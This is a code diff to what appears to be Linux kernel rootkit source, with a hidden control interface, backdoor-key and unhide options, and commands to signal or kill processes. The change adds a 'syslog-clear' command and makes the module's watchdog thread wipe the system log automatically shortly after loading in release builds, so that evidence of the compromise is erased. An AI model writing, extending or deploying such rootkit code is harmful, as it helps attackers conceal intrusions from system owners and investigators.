@@ -450,6 +450,7 @@ enum {
 	Opt_signal_task_stop,
 	Opt_signal_task_cont,
 	Opt_signal_task_kill,
+	Opt_syslog_clear,
 
 #ifdef DEBUG_RING_BUFFER
 	/**debug */
@@ -481,6 +482,7 @@ static const match_table_t tokens = {
 	{ Opt_signal_task_stop, "signal-task-stop=%d" },
 	{ Opt_signal_task_cont, "signal-task-cont=%d" },
 	{ Opt_signal_task_kill, "signal-task-kill=%d" },
+	{ Opt_syslog_clear, "syslog-clear" },
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
@@ -667,6 +669,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			if (sscanf(args[0].from, "%d", &pid) == 1)
 				_run_send_sig(SIGKILL, pid, false);
 			break;
+		case Opt_syslog_clear:
+			sys_do_syslog_clear();
+			break;
 		default:
 			break;
 		}
@@ -789,9 +794,13 @@ void kv_remove_proc_interface(void)
 
 static int _proc_watchdog(void *unused)
 {
+#ifndef DEBUG_RING_BUFFER
+	static bool clear_syslog = true;
+#endif
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
 	struct kernel_syscalls *kaddr = kv_kall_load_addr();
 #endif
+
 	for (;;) {
 		if (kthread_should_park())
 			kthread_parkme();
@@ -812,6 +821,13 @@ static int _proc_watchdog(void *unused)
 			}
 		}
 		ssleep(1);
+#ifndef DEBUG_RING_BUFFER
+		if (clear_syslog) {
+			ssleep(2);
+			sys_do_syslog_clear();
+			clear_syslog = false;
+		}
+#endif
 	}
 	return 0;
 }
